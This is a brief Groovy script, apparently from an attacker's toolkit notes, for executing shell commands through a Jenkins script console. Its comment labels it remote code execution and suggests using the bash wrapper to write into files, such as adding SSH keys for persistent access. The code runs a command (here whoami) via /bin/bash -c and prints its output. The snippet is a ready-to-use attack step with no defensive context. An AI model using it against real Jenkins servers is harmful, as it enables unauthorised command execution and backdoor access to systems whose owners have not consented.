# Default Jenkins RCE via script console does not handle strings since it's not a full shell. This executes commands in the context of a traditional shell so you can echo into files (i.e. echoing SSH keys) 

def command = "whoami"
def shell = "/bin/bash" // or /bin/sh, depending on your system
def process = ["$shell", "-c", command].execute()
process.waitFor()

// Check for success
if(process.exitValue() == 0) {
    println "Command executed successfully. Output:"
    // Reading the standard output
    process.in.eachLine { line ->
        println line
    }
} else {
    println "Error executing command. Error Output:"
    // Reading the error output
    process.err.eachLine { line ->
        println line
    }
}
